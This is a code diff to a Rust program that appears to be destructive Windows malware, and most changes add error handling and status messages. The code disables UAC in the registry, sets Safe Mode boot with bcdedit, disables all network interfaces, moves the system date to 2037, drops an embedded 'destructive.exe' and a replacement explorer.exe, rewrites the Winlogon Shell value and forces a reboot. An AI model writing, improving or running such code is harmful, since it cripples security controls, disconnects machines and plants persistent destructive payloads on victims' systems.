@@ -10,40 +10,69 @@ use std::env;
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let uac_key = hkcu.open_subkey_with_flags(
+
+    let uac_key = match hkcu.open_subkey_with_flags(
         r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
         KEY_SET_VALUE
-    )?;
+    ) {
+        Ok(key) => key,
+        Err(e) => {
+            eprintln!("Failed to open UAC registry key: {}", e);
+            return Err(e);
+        }
+    };
 
     // Set EnableLUA to 0 to disable UAC
-    uac_key.set_value("EnableLUA", &0u32)?;
-
-    println!("UAC has been disabled (EnableLUA set to 0).");
-
-    Ok(())
+    match uac_key.set_value("EnableLUA", &0u32) {
+        Ok(_) => {
+            println!("UAC has been disabled (EnableLUA set to 0).");
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to modify UAC registry value: {}", e);
+            Err(e)
+        }
+    }
 }
 
 fn enable_safe_mode() -> io::Result<()> {
     // Set the system to boot in Safe Mode
-    Command::new("bcdedit.exe")
+    let status = Command::new("bcdedit.exe")
         .arg("/set")
         .arg("{current}")
         .arg("safeboot")
         .arg("minimal")
         .stdout(Stdio::null())
         .stderr(Stdio::null())
-        .output()?;
+        .output();
 
-    Ok(())
+    match status {
+        Ok(_) => {
+            println!("System set to boot in Safe Mode.");
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to enable Safe Mode: {}", e);
+            Err(e)
+        }
+    }
 }
 
 fn disable_network_interfaces() -> Result<(), std::io::Error> {
-    // Disable all interfaces
+    // Retrieve the list of network interfaces
     let output = Command::new("netsh")
         .arg("interface")
         .arg("show")
         .arg("interface")
-        .output()?;
+        .output();
+
+    let output = match output {
+        Ok(o) => o,
+        Err(e) => {
+            eprintln!("Failed to retrieve network interfaces: {}", e);
+            return Err(e);
+        }
+    };
 
     let interfaces = String::from_utf8_lossy(&output.stdout);
 
@@ -53,13 +82,18 @@ fn disable_network_interfaces() -> Result<(), std::io::Error> {
             let parts: Vec<&str> = line.split_whitespace().collect();
             if let Some(interface_name) = parts.get(3) {
                 println!("Disabling interface: {}", interface_name);
-                let _ = Command::new("netsh")
+
+                let disable_status = Command::new("netsh")
                     .arg("interface")
                     .arg("set")
                     .arg("interface")
                     .arg(interface_name)
                     .arg("disable")
                     .output();
+
+                if let Err(e) = disable_status {
+                    eprintln!("Failed to disable interface {}: {}", interface_name, e);
+                }
             }
         }
     }
@@ -68,23 +102,32 @@ fn disable_network_interfaces() -> Result<(), std::io::Error> {
 }
 
 fn change_system_date() -> Result<(), String> {
-    // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
-    let date_command = "date 12-19-2037";
+    // Change system date to 12-19-2037 (Windows format mm-dd-yyyy)
+    let date_command = "date 12-12-2037";
 
     // Run date command
     let date_output = Command::new("cmd")
         .arg("/C")
         .arg(date_command)
         .stderr(Stdio::inherit())  // Pass error output to console
-        .output()
-        .map_err(|e| e.to_string())?;
+        .output();
 
-    if !date_output.status.success() {
-        return Err(format!("Failed to change date: {}", String::from_utf8_lossy(&date_output.stderr)));
+    match date_output {
+        Ok(output) => {
+            if output.status.success() {
+                println!("System date changed to 12-12-2037.");
+                Ok(())
+            } else {
+                Err(format!(
+                    "Failed to change date: {}",
+                    String::from_utf8_lossy(&output.stderr)
+                ))
+            }
+        }
+        Err(e) => {
+            Err(format!("Failed to execute date command: {}", e))
+        }
     }
-
-    println!("System date changed to 01-19-2037.");
-    Ok(())
 }
 
 fn is_admin() -> bool {
@@ -111,15 +154,33 @@ fn extract_embedded_exe() -> io::Result<()> {
     
     // Ensure the target directory exists
     if !target_dir.exists() {
-        fs::create_dir_all(target_dir)?;
-        println!("Created directory: {}", target_dir.display());
+        match fs::create_dir_all(target_dir) {
+            Ok(_) => println!("Created directory: {}", target_dir.display()),
+            Err(e) => {
+                eprintln!("Failed to create directory {}: {}", target_dir.display(), e);
+                return Err(e);
+            }
+        }
     }
 
     // Write the embedded executable to a file
     let exe_path = target_dir.join("destructive.exe");
-    let mut exe_file = File::create(&exe_path)?;
-    exe_file.write_all(include_bytes!("../resources/destructive.exe"))?;
-    println!("Executable saved to {}.", exe_path.display());
+    
+    let mut exe_file = match File::create(&exe_path) {
+        Ok(file) => file,
+        Err(e) => {
+            eprintln!("Failed to create file {}: {}", exe_path.display(), e);
+            return Err(e);
+        }
+    };
+
+    match exe_file.write_all(include_bytes!("../resources/destructive.exe")) {
+        Ok(_) => println!("Executable saved to {}.", exe_path.display()),
+        Err(e) => {
+            eprintln!("Failed to write executable file {}: {}", exe_path.display(), e);
+            return Err(e);
+        }
+    }
 
     Ok(())
 }
@@ -133,26 +194,47 @@ fn extract_explorer_exe() -> io::Result<()> {
     let target_path = Path::new(&target_path_str);
 
     // Create (or overwrite) the file at the target path
-    let mut file = File::create(&target_path)?;
+    let mut file = match File::create(&target_path) {
+        Ok(f) => f,
+        Err(e) => {
+            eprintln!("Failed to create file {}: {}", target_path.display(), e);
+            return Err(e);
+        }
+    };
 
     // Write the embedded executable data to the file
-    file.write_all(include_bytes!("../resources/explorer.exe"))?;
-    println!("Explorer executable saved to {}.", target_path.display());
-
-    Ok(())
+    match file.write_all(include_bytes!("../resources/explorer.exe")) {
+        Ok(_) => {
+            println!("Explorer executable saved to {}.", target_path.display());
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to write executable data to {}: {}", target_path.display(), e);
+            Err(e)
+        }
+    }
 }
 
 fn reboot_system() -> io::Result<()> {
-    // Shutdown and reboot the system to Safe Mode
-    Command::new("shutdown.exe")
+    // Shutdown and reboot the system
+    let status = Command::new("shutdown.exe")
         .arg("-r")
         .arg("-t")
         .arg("7")
         .stdout(Stdio::null())
         .stderr(Stdio::null())
-        .output()?;
+        .output();
 
-    Ok(())
+    match status {
+        Ok(_) => {
+            println!("System reboot command executed successfully.");
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to execute system reboot: {}", e);
+            Err(e)
+        }
+    }
 }
 
 fn create_directory() -> io::Result<()> {
@@ -223,17 +305,26 @@ fn set_system_path_first() -> io::Result<()> {
 fn modify_registry() -> io::Result<()> {
     // Open the registry key for Winlogon with write access
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
+
+    let winlogon_key = match hkcu.create_subkey_with_flags(
         r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
         KEY_WRITE,
-    )?;
+    ) {
+        Ok((key, _)) => key,
+        Err(e) => {
+            eprintln!("Failed to open or create registry key: {}", e);
+            return Err(e);
+        }
+    };
 
     // Set the new "Shell" value
-    let new_shell_value = r"cmd.exe /c explorer.exe";  
-    winlogon_key.set_value("Shell", &new_shell_value)?;
+    let new_shell_value = r"cmd.exe /c explorer.exe";
+    if let Err(e) = winlogon_key.set_value("Shell", &new_shell_value) {
+        eprintln!("Failed to modify registry value: {}", e);
+        return Err(e);
+    }
 
     println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
-
     Ok(())
 }
 
